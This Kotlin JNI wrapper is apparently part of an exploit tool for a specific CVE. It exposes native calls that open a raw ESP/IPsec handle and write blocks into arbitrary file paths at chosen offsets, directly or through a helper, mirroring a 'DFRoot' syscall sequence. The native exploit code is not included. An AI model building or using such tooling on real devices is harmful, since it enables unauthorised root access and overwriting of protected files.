package com.ghostlock.app.jni.cve43284

import com.ghostlock.app.log.log

/** 薄 JNI：只暴露 DFRoot 同款 syscall 序列，不做 plan/IV/校验。 */
object NativeRawEsp {
    init {
        System.loadLibrary("ghostlock_jni")
    }

    private external fun nativeOpen(spi: Int, encapPort: Int, senderPort: Int): Long
    private external fun nativeWriteBlock(handle: Long, path: String, offset: Long, iv: ByteArray, sequence: Int): Boolean
    private external fun nativeWriteBlockViaHelper(
        handle: Long, path: String, offset: Long, iv: ByteArray, sequence: Int, helperPath: String,
    ): Boolean
    private external fun nativeLastError(): String
    private external fun nativeClose(handle: Long)

    fun open(spi: Int, encapPort: Int, senderPort: Int): Long {
        log.verbose("NativeRawEsp.open spi=" + spi + " encap=" + encapPort + " sender=" + senderPort)
        val handle = nativeOpen(spi, encapPort, senderPort)
        log.debug("NativeRawEsp.open result handle=" + handle)
        return handle
    }

    fun writeBlock(handle: Long, path: String, offset: Long, iv: ByteArray, sequence: Int): Boolean {
        log.verbose("NativeRawEsp.writeBlock path=" + path + " offset=" + offset + " seq=" + sequence)
        val ok = nativeWriteBlock(handle, path, offset, iv, sequence)
        log.debug("NativeRawEsp.writeBlock result ok=" + ok)
        return ok
    }

    fun writeBlockViaHelper(
        handle: Long, path: String, offset: Long, iv: ByteArray, sequence: Int, helperPath: String,
    ): Boolean {
        log.verbose("NativeRawEsp.writeBlockViaHelper path=" + path + " offset=" + offset + " helper=" + helperPath)
        val ok = nativeWriteBlockViaHelper(handle, path, offset, iv, sequence, helperPath)
        log.debug("NativeRawEsp.writeBlockViaHelper result ok=" + ok)
        return ok
    }

    fun lastError(): String {
        val text = nativeLastError()
        log.debug("NativeRawEsp.lastError value=" + text)
        return text
    }

    fun close(handle: Long) {
        log.verbose("NativeRawEsp.close handle=" + handle)
        nativeClose(handle)
        log.debug("NativeRawEsp.close result ok=true")
    }
}
